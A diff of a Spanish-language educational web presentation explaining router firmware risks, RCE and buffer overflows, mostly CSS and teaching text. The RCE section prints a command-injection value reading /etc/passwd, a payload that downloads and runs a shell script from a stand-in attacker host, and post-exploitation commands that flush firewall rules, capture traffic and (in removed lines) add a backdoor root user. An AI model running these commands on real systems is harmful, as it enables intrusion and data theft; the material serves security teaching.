+.bar-meta{display:flex;justify-content:space-between;align-items:center;margin-bottom:3px}
+.bar-name{font-size:13px;color:var(--tx2)}.bar-val{font-family:var(--mono);font-size:12px;color:var(--tx2)}
+.bar-track{height:6px;background:var(--bg3);border-radius:4px;overflow:hidden;border:1px solid var(--bd)}
+.bar-fill{height:100%;border-radius:4px}
+.bf-ok{background:var(--gr)}.bf-warn{background:var(--yl)}.bf-danger{background:var(--red)}
 
 /* GLOSSARY */
-.glossary-item { border-bottom: 1px solid var(--border); padding: 1.1rem 0; }
-.glossary-item:last-child { border-bottom: none; }
-.g-term { font-family: var(--mono); font-size: 14px; font-weight: 600; color: var(--accent); margin-bottom: .35rem; display: flex; align-items: center; gap: .6rem; flex-wrap: wrap; }
-.g-tag { font-size: 10px; color: var(--text2); font-family: var(--sans); font-weight: 400; }
-.g-def { font-size: 14px; color: var(--text2); line-height: 1.7; }
+.glossary-item{border-bottom:1px solid var(--bd);padding:1rem 0}
+.glossary-item:last-child{border-bottom:none}
+.g-term{font-family:var(--mono);font-size:14px;font-weight:600;color:var(--ac);margin-bottom:.3rem;display:flex;align-items:center;gap:.5rem;flex-wrap:wrap}
+.g-tag{font-size:10px;color:var(--tx2);font-family:var(--sans);font-weight:400}
+.g-def{font-size:13px;color:var(--tx2);line-height:1.7}
 
 /* QUIZ */
-.quiz-item { background: var(--bg2); border: 1px solid var(--border); border-radius: 10px; padding: 1.35rem 1.6rem; margin-bottom: 1rem; }
-.quiz-q { font-size: 15px; font-weight: 600; color: var(--text); margin-bottom: .75rem; line-height: 1.5; }
-.quiz-opts { display: flex; flex-direction: column; gap: .45rem; }
-.qopt { display: flex; align-items: flex-start; gap: .75rem; padding: .65rem .9rem; border-radius: 6px; border: 1px solid var(--border); background: var(--bg3); cursor: pointer; transition: all .15s; font-size: 14px; color: var(--text2); text-align: left; width: 100%; }
-.qopt:hover { border-color: var(--border2); color: var(--text); background: var(--bg4); }
-.qopt.correct { border-color: var(--green-border); background: var(--green-bg); color: var(--green); }
-.qopt.wrong   { border-color: var(--red-border);   background: var(--red-bg);   color: var(--red); }
-.qopt.reveal  { border-color: var(--green-border); background: var(--green-bg); color: var(--green); opacity: .55; }
-.qopt-key { font-family: var(--mono); font-size: 11px; font-weight: 600; min-width: 20px; height: 20px; display: flex; align-items: center; justify-content: center; border-radius: 3px; border: 1px solid var(--border2); background: var(--bg2); flex-shrink: 0; margin-top: 1px; }
-.quiz-feedback { font-size: 13px; margin-top: .75rem; padding: .65rem .9rem; border-radius: 6px; display: none; line-height: 1.6; }
-.quiz-feedback.show { display: block; }
-.quiz-feedback.ok   { background: var(--green-bg); border: 1px solid var(--green-border); color: #88ddaa; }
-.quiz-feedback.bad  { background: var(--red-bg);   border: 1px solid var(--red-border);   color: #dd9988; }
-.quiz-reset { margin-top: .85rem; font-family: var(--mono); font-size: 11px; padding: 6px 14px; border-radius: 5px; border: 1px solid var(--border2); background: transparent; color: var(--text2); cursor: pointer; display: none; }
-.quiz-reset.show { display: inline-block; }
-.quiz-reset:hover { background: var(--bg3); color: var(--text); }
+.quiz-item{background:var(--bg2);border:1px solid var(--bd);border-radius:8px;padding:1.1rem 1.35rem;margin-bottom:.85rem}
+.quiz-q{font-size:14px;font-weight:600;color:var(--tx);margin-bottom:.65rem;line-height:1.5}
+.quiz-opts{display:flex;flex-direction:column;gap:.4rem}
+.qopt{display:flex;align-items:flex-start;gap:.65rem;padding:.6rem .85rem;border-radius:5px;border:1px solid var(--bd);background:var(--bg3);cursor:pointer;transition:all .15s;font-size:13px;color:var(--tx2);text-align:left;width:100%}
+.qopt:hover{border-color:var(--bd2);color:var(--tx);background:var(--bg4)}
+.qopt.correct{border-color:var(--gbr);background:var(--gb);color:var(--gr)}
+.qopt.wrong{border-color:var(--rbr);background:var(--rb);color:var(--red)}
+.qopt-key{font-family:var(--mono);font-size:10px;font-weight:600;min-width:18px;height:18px;display:flex;align-items:center;justify-content:center;border-radius:3px;border:1px solid var(--bd2);background:var(--bg2);flex-shrink:0;margin-top:1px}
+.quiz-feedback{font-size:12px;margin-top:.65rem;padding:.6rem .85rem;border-radius:5px;display:none;line-height:1.55}
+.quiz-reset{margin-top:.75rem;font-family:var(--mono);font-size:11px;padding:5px 12px;border-radius:5px;border:1px solid var(--bd2);background:transparent;color:var(--tx2);cursor:pointer;display:none}
+.quiz-reset:hover{background:var(--bg3);color:var(--tx)}
 
-@media(max-width:650px){ .g2,.g3 { grid-template-columns: 1fr; } .mem-grid { grid-template-columns: repeat(8,1fr); } }
+/* RESPONSIVE */
+@media(max-width:700px){
+  header h1{display:none}
+  .h-nav{display:none}
+  .menu-toggle{display:block}
+  .g2,.g3{grid-template-columns:1fr}
+  .mem-grid{grid-template-columns:repeat(8,1fr)}
+  .stat-block{flex-direction:column;gap:.75rem;align-items:flex-start}
+  .stat-num{font-size:36px}
+  .prot-row{flex-direction:column}
+  .prot-badges{flex-direction:row;align-items:flex-start}
+  .vtabs{flex-direction:column}
+  .vtab{border-right:none;border-bottom:1px solid var(--bd)}
+  .vtab:last-child{border-bottom:none}
+  .stbl{font-size:11px}
+  .stbl td:first-child{white-space:normal}
+}
+@media(max-width:420px){
+  .wrap{padding:1.5rem .9rem 4rem}
+  .s-title{font-size:18px}
+  .mem-grid{grid-template-columns:repeat(8,1fr)}
+}
 </style>
 </head>
 <body>
@@ -271,95 +231,82 @@ hr { border: none; border-top: 1px solid var(--border); margin: 2rem 0; }
     <button class="h-btn" onclick="showS('s4',this)">Glosario</button>
     <button class="h-btn" onclick="showS('s5',this)">Repaso</button>
   </nav>
+  <button class="menu-toggle" onclick="toggleMenu()" aria-label="Menú">☰</button>
 </header>
+
+<nav class="mobile-nav" id="mobileNav">
+  <button class="h-btn active" onclick="showS('s1',this);toggleMenu()">2.1 Firmware</button>
+  <button class="h-btn" onclick="showS('s2',this);toggleMenu()">2.2 RCE / BOF</button>
+  <button class="h-btn" onclick="showS('s3',this);toggleMenu()">2.3 Ciclo de vida</button>
+  <button class="h-btn" onclick="showS('s4',this);toggleMenu()">Glosario</button>
+  <button class="h-btn" onclick="showS('s5',this);toggleMenu()">Repaso</button>
+</nav>
 
 <main class="wrap">
 
-<!-- ═══════════════════════════ SECCIÓN 1 ═══════════════════════════ -->
+<!-- ═══ SECCIÓN 1: FIRMWARE ═══ -->
 <section class="section active" id="s1">
   <div class="s-num">DIAPOSITIVA 2.1</div>
   <h2 class="s-title">El Firmware: La Caja Negra</h2>
   <p class="s-lead">Antes de hablar de cómo se compromete un dispositivo perimetral, necesitas entender qué hay dentro. La respuesta es: firmware. Y es mucho más problemático de lo que parece.</p>
 
-  <h3>¿Qué es el firmware, exactamente?</h3>
-  <p>El <strong>firmware</strong> es un programa especial que viene grabado directamente en un chip de memoria dentro del dispositivo (router, firewall, switch). No es Windows, no es Linux de escritorio — es un software <strong>embebido</strong>, diseñado para arrancar rápido y controlar el hardware específico de ese dispositivo.</p>
-  <p>A diferencia de un programa que instalas, el firmware <em>es</em> el sistema operativo del dispositivo. Si lo borras, el dispositivo no arranca. Si lo modificas mal, el dispositivo queda inutilizable.</p>
+  <h3>¿Qué es el firmware?</h3>
+  <p>El <strong>firmware</strong> es un programa grabado directamente en un chip de memoria dentro del dispositivo (router, firewall, switch). No es Windows ni Linux de escritorio — es un software <strong>embebido</strong> diseñado para arrancar rápido y controlar el hardware específico. Si lo borras, el dispositivo no arranca.</p>
 
   <div class="analogy">
     <div class="analogy-label">ANALOGÍA — El BIOS de tu computadora</div>
-    <p>Cuando enciendes tu PC, antes de que cargue Windows hay un programa ya corriendo: el BIOS o UEFI. Ese es firmware. Verifica el hardware y carga el sistema operativo. En un router, el firmware hace algo similar pero permanente — controla todo el tráfico de red de forma continua, no solo al inicio. La diferencia es que el BIOS de tu PC recibe actualizaciones y es más fácil de reemplazar. El firmware del router: no tanto.</p>
+    <p>Cuando enciendes tu PC, antes de Windows hay un programa corriendo: el BIOS o UEFI. Eso es firmware. En un router, el firmware hace algo similar pero permanente — controla todo el tráfico de red de forma continua. La diferencia es que el BIOS de tu PC se actualiza fácilmente. El firmware del router: no tanto.</p>
   </div>
 
-  <h3>¿Qué controla el firmware? — haz clic en cada capa para ver los detalles</h3>
+  <h3>¿Qué controla? — haz clic en cada capa</h3>
   <div class="layer-stack">
     <div class="layer-stack-header">
       <div class="dot" style="background:#ff5f57"></div>
       <div class="dot" style="background:#ffbd2e"></div>
       <div class="dot" style="background:#28ca41"></div>
-      <span style="margin-left:6px;">Arquitectura interna de un dispositivo perimetral (router / firewall)</span>
+      <span style="margin-left:5px;">Arquitectura interna de un dispositivo perimetral (router / firewall)</span>
     </div>
     <div class="layers-wrap">
       <div class="layer l-app" onclick="toggleLayer('ld-app')">
-        <div class="layer-info">
-          <div class="layer-name">Interfaz web de administración</div>
-          <div class="layer-desc">Panel de control en el navegador — reglas, usuarios, configuración de red</div>
-        </div>
-        <span class="layer-tag" style="color:var(--text3);">▶ clic para detalles</span>
+        <div class="layer-info"><div class="layer-name">Interfaz web de administración</div><div class="layer-desc">Panel de control — reglas, usuarios, configuración de red</div></div>
+        <span class="layer-tag" style="color:var(--tx3)">▶ detalles</span>
       </div>
       <div class="layer-detail" id="ld-app">
-        <h5>¿QUÉ ES?</h5>
-        <p>La página web que aparece cuando abres el navegador en 192.168.1.1. Desde ahí el administrador configura reglas de firewall, cambia contraseñas, ve el tráfico, gestiona VPN, etc. Parece algo inocente — pero es la puerta de entrada principal para muchos ataques.</p>
-        <h5>¿POR QUÉ ES PELIGROSA?</h5>
-        <p>Muchas veces queda <strong style="color:var(--red);">expuesta a internet por error</strong> — el administrador activa "acceso remoto" sin dimensionar el riesgo, o la configuración por defecto del dispositivo la deja abierta en el puerto 443. Herramientas como Shodan indexan millones de estas interfaces expuestas.</p>
-        <h5>DATO IMPORTANTE</h5>
-        <p>La interfaz web no es el problema en sí — el problema es que está escrita en el mismo código cerrado del firmware, procesa las entradas del usuario, y si ese procesamiento tiene fallos (como los de RCE), el atacante tiene una puerta directa al sistema.</p>
+        <h5>¿QUÉ ES?</h5><p>La página web en 192.168.1.1. Desde ahí se configuran reglas de firewall, contraseñas, VPN, etc. Parece inocente — pero es la puerta de entrada principal para muchos ataques.</p>
+        <h5>¿POR QUÉ ES PELIGROSA?</h5><p>Muchas veces queda <strong style="color:var(--red)">expuesta a internet por error</strong>. Herramientas como Shodan indexan millones de estas interfaces. La interfaz procesa entradas del usuario — si ese procesamiento tiene fallos RCE, el atacante tiene una puerta directa.</p>
       </div>
 
       <div class="layer l-net" onclick="toggleLayer('ld-net')">
-        <div class="layer-info">
-          <div class="layer-name">Stack de red y reglas de firewall</div>
-          <div class="layer-desc">Procesamiento de paquetes, NAT, filtrado de tráfico, VPN, IDS/IPS</div>
-        </div>
-        <span class="layer-tag" style="color:#7ac7d4;">▶ clic para detalles</span>
+        <div class="layer-info"><div class="layer-name">Stack de red y reglas de firewall</div><div class="layer-desc">Procesamiento de paquetes, NAT, filtrado, VPN, IDS/IPS</div></div>
+        <span class="layer-tag" style="color:#7ac7d4">▶ detalles</span>
       </div>
       <div class="layer-detail" id="ld-net">
-        <h5>¿QUÉ ES?</h5>
-        <p>El motor que analiza cada paquete de datos que entra o sale de tu red. Aplica reglas como "bloquear tráfico al puerto 22 desde internet" o "permitir solo HTTPS hacia el servidor web". Es la razón por la que existe el dispositivo — sin esta capa, no hay firewall.</p>
-        <h5>¿POR QUÉ IMPORTA PARA LA SEGURIDAD?</h5>
-        <p>Si un atacante compromete esta capa, puede reescribir las reglas del firewall (abrir todos los puertos), interceptar y leer todo el tráfico que pasa por la red, o redirigir conexiones hacia servidores maliciosos. El impacto es total para toda la organización.</p>
+        <h5>¿QUÉ ES?</h5><p>El motor que analiza cada paquete. Aplica reglas como "bloquear tráfico al puerto 22 desde internet". Es la razón por la que existe el dispositivo.</p>
+        <h5>¿POR QUÉ IMPORTA?</h5><p>Si un atacante compromete esta capa, puede reescribir las reglas del firewall, interceptar todo el tráfico, o redirigir conexiones hacia servidores maliciosos. El impacto es total para toda la organización.</p>
       </div>
 
       <div class="layer l-fw" onclick="toggleLayer('ld-fw')">
-        <div class="layer-info">
-          <div class="layer-name">⚠ FIRMWARE — Sistema operativo embebido</div>
-          <div class="layer-desc">Código grabado en chip. Controla arranque, hardware, autenticación. Código cerrado, raramente actualizado.</div>
-        </div>
-        <span class="layer-tag" style="color:var(--red);">← EL PROBLEMA ESTÁ AQUÍ</span>
+        <div class="layer-info"><div class="layer-name">⚠ FIRMWARE — Sistema operativo embebido</div><div class="layer-desc">Código grabado en chip. Controla arranque, hardware, autenticación. Código cerrado, raramente actualizado.</div></div>
+        <span class="layer-tag" style="color:var(--red)">← EL PROBLEMA ESTÁ AQUÍ</span>
       </div>
       <div class="layer-detail" id="ld-fw">
-        <h5>¿QUÉ ES EXACTAMENTE?</h5>
-        <p>Un programa escrito en C o C++ que corre directamente sobre el hardware. No tiene las capas de seguridad de un sistema operativo moderno. Es pequeño, eficiente, y casi siempre propietario (el fabricante no publica el código fuente).</p>
+        <h5>¿QUÉ ES?</h5><p>Un programa en C o C++ que corre directamente sobre el hardware. Sin las capas de seguridad de un SO moderno. Pequeño, eficiente, y casi siempre propietario.</p>
         <h5>¿POR QUÉ ES UN PROBLEMA?</h5>
         <ul>
-          <li><strong>Código cerrado:</strong> nadie externo puede revisarlo para encontrar errores. Los atacantes hacen ingeniería inversa — el proceso de analizar el código máquina sin tener el original.</li>
-          <li><strong>Sin protecciones modernas:</strong> no tiene ASLR, DEP, ni stack canaries (lo verás en la sección 2). Estas son defensas estándar en cualquier PC o servidor, pero raras en firmware.</li>
-          <li><strong>Actualización muy lenta:</strong> el fabricante puede tardar meses en desarrollar, probar y publicar un parche. Mientras tanto, los dispositivos quedan expuestos.</li>
-          <li><strong>Fin de soporte (EoL):</strong> cuando el modelo es viejo, el fabricante deja de publicar parches. Las vulnerabilidades quedan permanentes para siempre.</li>
+          <li><strong>Código cerrado:</strong> los atacantes hacen ingeniería inversa — analizan el código máquina sin tener el original.</li>
+          <li><strong>Sin protecciones modernas:</strong> sin ASLR, DEP, ni stack canaries — defensas estándar en cualquier PC.</li>
+          <li><strong>Actualización muy lenta:</strong> el fabricante puede tardar meses. Mientras tanto, los dispositivos quedan expuestos.</li>
+          <li><strong>Fin de soporte (EoL):</strong> cuando el modelo es viejo, no hay más parches — las vulnerabilidades son permanentes.</li>
         </ul>
       </div>
 
       <div class="layer l-hw" onclick="toggleLayer('ld-hw')">
-        <div class="layer-info">
-          <div class="layer-name">Hardware físico (CPU / ASIC / memoria flash)</div>
-          <div class="layer-desc">Silicio. Los chips reales donde corre el firmware.</div>
-        </div>
-        <span class="layer-tag" style="color:var(--text3);">▶ clic para detalles</span>
+        <div class="layer-info"><div class="layer-name">Hardware físico (CPU / ASIC / memoria flash)</div><div class="layer-desc">Los chips reales donde corre el firmware</div></div>
+        <span class="layer-tag" style="color:var(--tx3)">▶ detalles</span>
       </div>
       <div class="layer-detail" id="ld-hw">
-        <h5>¿QUÉ ES?</h5>
-        <p>Los circuitos integrados físicos. En un router típico hay: una CPU (normalmente MIPS o ARM de bajo costo), memoria RAM, memoria flash (donde vive el firmware permanentemente), y chips de red especializados (ASICs) para procesar paquetes muy rápido.</p>
-        <h5>¿IMPORTA PARA LA SEGURIDAD?</h5>
-        <p>Sí. Si el hardware no tiene un chip de arranque seguro (Secure Boot), el firmware puede ser reemplazado por uno malicioso sin que el dispositivo lo detecte. Además, muchos procesadores de bajo costo no implementan las extensiones de seguridad (como el bit NX para DEP) que tienen los chips modernos de servidores y PCs.</p>
+        <h5>¿QUÉ ES?</h5><p>Los circuitos integrados físicos: CPU (normalmente MIPS o ARM de bajo costo), RAM, memoria flash (donde vive el firmware), y chips ASIC para procesar paquetes.</p>
+        <h5>¿IMPORTA PARA LA SEGURIDAD?</h5><p>Sí. Sin chip de arranque seguro (Secure Boot), el firmware puede ser reemplazado por uno malicioso. Muchos procesadores de bajo costo no implementan extensiones de seguridad que tienen los chips de servidores.</p>
       </div>
     </div>
   </div>
@@ -368,51 +315,46 @@ hr { border: none; border-top: 1px solid var(--border); margin: 2rem 0; }
   <div class="g2">
     <div class="card">
       <div class="card-label">Tu computadora personal</div>
-      <p>Windows Update, macOS Software Update, apt en Linux — todos ofrecen parches <strong>automáticos y frecuentes</strong>, a veces semanales. Si hay una vulnerabilidad crítica, el parche puede llegar en días y se instala solo.</p>
+      <p>Windows Update, macOS, apt — parches <strong>automáticos y frecuentes</strong>. Si hay una vulnerabilidad crítica, el parche puede llegar en días y se instala solo.</p>
     </div>
     <div class="card red">
-      <div class="card-label" style="color:var(--red);">Router / Firewall empresarial</div>
-      <p>El fabricante puede tardar <strong>meses</strong> en desarrollar y probar un parche. El administrador tiene que instalarlo manualmente, con miedo de romper el dispositivo. Cuando el equipo llega a fin de soporte, <strong>ya no hay más parches</strong> — nunca.</p>
+      <div class="card-label" style="color:var(--red)">Router / Firewall empresarial</div>
+      <p>El fabricante puede tardar <strong>meses</strong> en desarrollar un parche. Instalación manual con miedo a romper el dispositivo. Cuando llega al EoL, <strong>ya no hay más parches — nunca</strong>.</p>
     </div>
   </div>
 
   <div class="stat-block">
     <div class="stat-num">+3</div>
-    <div class="stat-text">
-      <strong>años promedio</strong> que un router empresarial pasa sin recibir una actualización de firmware según estudios de seguridad.<br><br>
-      Eso significa que cualquier vulnerabilidad que exista en ese firmware permanece activa, explotable, y expuesta a internet las 24 horas. A eso le llamamos <strong>la caja negra</strong> — no sabes qué hay adentro, y nadie puede arreglarlo fácilmente.
-    </div>
+    <div class="stat-text"><strong>años promedio</strong> que un router empresarial pasa sin recibir una actualización de firmware.<br><br>Eso significa que cualquier vulnerabilidad permanece activa, explotable y expuesta a internet las 24 horas. A eso le llamamos <strong>la caja negra</strong> — no sabes qué hay adentro, y nadie puede arreglarlo fácilmente.</div>
   </div>
 
   <h3>¿Por qué "caja negra"?</h3>
-  <p>El término viene de la ingeniería: una caja negra es un sistema donde puedes ver las entradas y las salidas, pero no lo que pasa adentro. El firmware de un router es exactamente eso — funciona, pero nadie sabe bien cómo, y no puedes auditarlo.</p>
-
   <div class="g3">
     <div class="card">
       <div class="card-label">Código propietario</div>
-      <p>El fabricante (Cisco, Netgear, Fortinet…) no publica el código fuente. Los investigadores solo pueden analizarlo haciendo ingeniería inversa — proceso lento, difícil e incompleto.</p>
+      <p>Cisco, Netgear, Fortinet… no publican el código fuente. Los investigadores solo pueden hacer ingeniería inversa — proceso lento e incompleto.</p>
     </div>
     <div class="card">
       <div class="card-label">Sin auditoría independiente</div>
-      <p>En software abierto (como Linux), miles de personas revisan el código constantemente. En firmware propietario, solo los empleados del fabricante lo ven — mucho menos control de calidad.</p>
+      <p>En software abierto como Linux, miles de personas revisan el código. En firmware propietario, solo empleados del fabricante lo ven — mucho menos control de calidad.</p>
     </div>
     <div class="card red">
-      <div class="card-label" style="color:var(--red);">Fin de soporte (EoL)</div>
-      <p>Cuando el modelo es descontinuado, el fabricante deja de publicar parches. Las vulnerabilidades existentes son <strong>permanentes</strong>. La única solución: reemplazar el hardware.</p>
+      <div class="card-label" style="color:var(--red)">Fin de soporte (EoL)</div>
+      <p>Cuando el modelo es descontinuado, el fabricante deja de publicar parches. Las vulnerabilidades son <strong>permanentes</strong>. Única solución: reemplazar el hardware.</p>
     </div>
   </div>
 
   <div class="important">
-    <div class="important-label">PARA RECORDAR EN TU PRESENTACIÓN</div>
+    <div class="important-label">PARA RECORDAR</div>
     <p>El firmware es la superficie de ataque más grande y menos vigilada de cualquier red empresarial. Es como la cerradura de la puerta principal — si tiene defectos de fábrica que nadie puede ver, cualquiera con la herramienta correcta puede abrirla. Y esa puerta lleva directamente a todo lo que hay adentro.</p>
   </div>
 </section>
 
-<!-- ═══════════════════════════ SECCIÓN 2 ═══════════════════════════ -->
+<!-- ═══ SECCIÓN 2: RCE / BOF ═══ -->
 <section class="section" id="s2">
   <div class="s-num">DIAPOSITIVA 2.2</div>
   <h2 class="s-title">Las Vulnerabilidades Estrella</h2>
-  <p class="s-lead">Con esa caja negra sin actualizar como superficie de ataque, ¿qué tipo de fallos aparecen y cómo se explotan? Las dos más peligrosas y más usadas en la práctica son RCE y Buffer Overflow.</p>
+  <p class="s-lead">Con esa caja negra sin actualizar como superficie de ataque, ¿qué tipo de fallos aparecen y cómo se explotan? Las dos más peligrosas y usadas en la práctica son RCE y Buffer Overflow.</p>
 
   <div class="vtabs">
     <button class="vtab active" onclick="showV('v-rce',this)">RCE — Ejecución Remota</button>
@@ -423,200 +365,145 @@ hr { border: none; border-top: 1px solid var(--border); margin: 2rem 0; }
 
   <!-- RCE -->
   <div class="vpanel active" id="v-rce">
-    <div class="card accent" style="margin-bottom:1.5rem;">
+    <div class="card accent" style="margin-bottom:1.25rem">
       <div class="card-label">Definición — RCE (Remote Code Execution)</div>
-      <p style="font-size:15px;"><strong>El atacante logra ejecutar código en tu dispositivo sin estar físicamente presente</strong>, solo a través de la red. El resultado habitual: una shell con privilegios de root — control total del dispositivo.</p>
+      <p style="font-size:14px"><strong>El atacante logra ejecutar código en tu dispositivo solo a través de la red</strong>, sin acceso físico. El resultado habitual: una shell con privilegios de root — control total del dispositivo.</p>
     </div>
 
     <div class="analogy">
       <div class="analogy-label">ANALOGÍA — La puerta de servicio mal diseñada</div>
-      <p>Imagina que el router es un edificio. La interfaz web de administración es una puerta de servicio trasera. Normalmente debería estar cerrada para extraños, pero alguien la dejó accesible desde la calle. La cerradura tiene un defecto de fabricación — si metes una llave con la forma incorrecta de cierta manera, abre. El atacante sabe el defecto, entra, y tiene acceso libre a todo el edificio — incluidas las salas de control de seguridad.</p>
+      <p>La interfaz web es una puerta trasera. Normalmente debería estar cerrada para extraños, pero alguien la dejó accesible desde la calle. La cerradura tiene un defecto — si metes una llave de cierta manera, abre. El atacante entra y tiene acceso libre a todo el edificio, incluidas las salas de control de seguridad.</p>
     </div>
 
-    <h3>¿Cómo ocurre un ataque RCE? — paso a paso</h3>
+    <h3>¿Cómo ocurre? — paso a paso</h3>
     <div class="steps">
       <div class="step">
         <div class="step-body">
           <h4>Reconocimiento: encontrar la interfaz expuesta</h4>
-          <p>El atacante usa herramientas como <strong>Shodan</strong> (el "Google de los dispositivos conectados") para encontrar routers y firewalls con su panel de administración expuesto a internet. Esto es más común de lo que parece — muchos administradores activan acceso remoto sin dimensionar el riesgo, o los dispositivos vienen con puertos abiertos por defecto.</p>
-          <div class="code"><span class="c"># Una búsqueda típica en Shodan (motor de búsqueda de dispositivos IoT)</span>
-<span class="acc">product:</span><span class="s">"Cisco RV320 Dual WAN VPN"</span> <span class="acc">port:</span><span class="s">443</span>
-<span class="c"># Resultado: miles de firewalls con interfaz web expuesta a internet pública</span>
-<span class="c"># El atacante tiene una lista de víctimas potenciales en segundos</span></div>
+          <p>El atacante usa <strong>Shodan</strong> (el "Google de los dispositivos conectados") para encontrar routers y firewalls con el panel de administración expuesto a internet.</p>
+          <div class="code"><span class="acc">product:</span><span class="s">"Cisco RV320 Dual WAN VPN"</span> <span class="acc">port:</span><span class="s">443</span>
+<span class="c"># Resultado: miles de firewalls con interfaz web expuesta en segundos</span></div>
         </div>
       </div>
-
       <div class="step">
         <div class="step-body">
-          <h4>Identificar el punto vulnerable: validación incorrecta de datos</h4>
-          <p>La interfaz web tiene formularios — login, diagnóstico de red, configuración. Muchos de estos formularios procesan la entrada del usuario pasándola directamente a comandos del sistema operativo del firmware, <strong>sin verificar que la entrada sea segura</strong>. Ese es el fallo.</p>
-          <div class="code"><span class="c">/* Código vulnerable típico en el firmware (C) */</span>
-<span class="c">/* username viene directamente del formulario web */</span>
-
-<span class="k">char</span> cmd[256];
+          <h4>Identificar el punto vulnerable: validación incorrecta</h4>
+          <p>Muchos formularios del firmware pasan la entrada del usuario directamente a comandos del SO <strong>sin verificar que sea segura</strong>.</p>
+          <div class="code"><span class="k">char</span> cmd[256];
 <span class="hl">sprintf(cmd, "ping -c 1 %s", hostname);</span>
-system(cmd);   <span class="c">/* ejecuta el comando sin filtrar la entrada */</span>
-
+system(cmd); <span class="c">/* ejecuta sin filtrar la entrada */</span>
 <span class="c">/* Si hostname = "8.8.8.8; cat /etc/passwd"
-   El sistema ejecuta: ping -c 1 8.8.8.8; cat /etc/passwd
-   Los ";" encadenan comandos — el segundo se ejecuta igual */</span></div>
-          <p>El punto clave: el firmware asume que el usuario solo pondrá una IP o un nombre de dominio. Un atacante pone algo diferente — y el sistema lo ejecuta sin cuestionarlo.</p>
+   Ejecuta: ping 8.8.8.8; cat /etc/passwd
+   El ";" encadena comandos — el segundo se ejecuta igual */</span></div>
         </div>
       </div>
-
       <div class="step">
         <div class="step-body">
           <h4>Enviar el payload malicioso</h4>
-          <p>El atacante construye una petición HTTP especialmente diseñada. En lugar de datos normales, manda un string que el firmware ejecutará como comandos del sistema.</p>
           <div class="code"><span class="w">POST</span> /cgi-bin/diagnostic.cgi HTTP/1.1
-Host: 203.0.113.45
-Content-Type: application/x-www-form-urlencoded
 
-<span class="c"># Payload: primero un comando legítimo, luego el malicioso</span>
 target=<span class="hl">8.8.8.8; wget http://atacante.com/shell.sh -O /tmp/s; sh /tmp/s</span>
-
-<span class="c"># El dispositivo ejecuta:
-#  1. ping 8.8.8.8          ← comando legítimo (cubre el ataque)
-#  2. wget .../shell.sh      ← descarga script malicioso
-#  3. sh /tmp/s              ← ejecuta el script</span></div>
+<span class="c"># 1. ping 8.8.8.8  ← cubre el ataque
+# 2. descarga script malicioso
+# 3. lo ejecuta</span></div>
         </div>
       </div>
-
       <div class="step">
         <div class="step-body">
           <h4>Obtener una reverse shell con privilegios root</h4>
-          <p>El script descargado abre una <strong>reverse shell</strong> — el dispositivo se conecta activamente al servidor del atacante y le entrega una terminal de comandos completa. Como el firmware corre como root, el atacante tiene el máximo nivel de acceso.</p>
-          <div class="code"><span class="c"># El atacante en su máquina ya tiene control total:</span>
-<span class="ok">root@firewall-empresa:~#</span> <span class="w">whoami</span>
-root
-
-<span class="ok">root@firewall-empresa:~#</span> <span class="w">iptables -F</span>
+          <div class="code"><span class="ok">root@firewall-empresa:~#</span> <span class="w">iptables -F</span>
 <span class="c"># Todas las reglas del firewall borradas de un comando</span>
-
-<span class="ok">root@firewall-empresa:~#</span> <span class="w">tcpdump -i eth0 -w /tmp/capture.pcap &amp;</span>
-<span class="c"># Capturando TODO el tráfico de la red — contraseñas, emails, datos</span>
-
-<span class="ok">root@firewall-empresa:~#</span> <span class="w">echo "backdoor:x:0:0::/:/bin/sh" >> /etc/passwd</span>
-<span class="c"># Creando usuario permanente de root — sobrevive al reinicio</span></div>
+<span class="ok">root@firewall-empresa:~#</span> <span class="w">tcpdump -i eth0 -w /tmp/capture.pcap &</span>
+<span class="c"># Capturando TODO el tráfico — contraseñas, emails, datos</span></div>
         </div>
       </div>
     </div>
 
     <div class="important">
       <div class="important-label">¿QUÉ PUEDE HACER EL ATACANTE CON ROOT EN EL FIREWALL?</div>
-      <p>Con acceso root al dispositivo perimetral tiene <strong>control total de toda la red</strong>: ve todo el tráfico (contraseñas, datos, comunicaciones internas), elimina las reglas de seguridad, redirige usuarios a sitios falsos (pharming), instala backdoors que sobreviven a reinicios, usa el dispositivo como pivote para atacar sistemas internos, o silenciosamente lo convierte en parte de una botnet.</p>
+      <p>Ve todo el tráfico, elimina reglas de seguridad, redirige usuarios a sitios falsos, instala backdoors persistentes, usa el dispositivo como pivote para atacar la red interna, o lo convierte en parte de una botnet.</p>
     </div>
 
-    <div class="card" style="margin-top:1.5rem;">
-      <div class="card-label">Caso real: CVE-2019-1653 — Cisco RV320 Dual WAN VPN Router</div>
-      <p>En enero de 2019 se descubrió que miles de firewalls Cisco RV320 tenían una vulnerabilidad RCE en su interfaz de diagnóstico. Un atacante podía ejecutar comandos arbitrarios <strong>sin autenticación</strong> — ni siquiera necesitaba contraseña. El exploit fue publicado públicamente. En menos de una semana, herramientas automatizadas escaneaban todo internet buscando routers vulnerables. El parche tardó semanas en llegar. Muchos dispositivos todavía estaban sin parchar meses después.</p>
+    <div class="card" style="margin-top:1.25rem">
+      <div class="card-label">Caso real: CVE-2019-1653 — Cisco RV320</div>
+      <p>En enero de 2019, miles de firewalls Cisco RV320 tenían una vulnerabilidad RCE en su interfaz de diagnóstico. Un atacante podía ejecutar comandos <strong>sin autenticación</strong>. El exploit fue publicado y en menos de una semana herramientas automatizadas escaneaban todo internet buscando routers vulnerables.</p>
     </div>
   </div>
 
   <!-- BUFFER OVERFLOW -->
   <div class="vpanel" id="v-bof">
-    <div class="card yellow" style="margin-bottom:1.5rem;">
-      <div class="card-label" style="color:var(--yellow);">Definición — Buffer Overflow (Desbordamiento de Memoria)</div>
-      <p style="font-size:15px;">Ocurre cuando un programa escribe <strong>más datos de los que puede contener una zona de memoria reservada</strong>, "derramándose" hacia zonas adyacentes — incluyendo la dirección que le dice al programa a dónde ir después de ejecutar una función.</p>
+    <div class="card yellow" style="margin-bottom:1.25rem">
+      <div class="card-label" style="color:var(--yl)">Definición — Buffer Overflow</div>
+      <p style="font-size:14px">Ocurre cuando un programa escribe <strong>más datos de los que puede contener una zona de memoria reservada</strong>, "derramándose" hacia zonas adyacentes — incluyendo la dirección que le dice al programa a dónde ir después de una función.</p>
     </div>
 
     <div class="analogy">
       <div class="analogy-label">ANALOGÍA — Los vasos numerados en la barra</div>
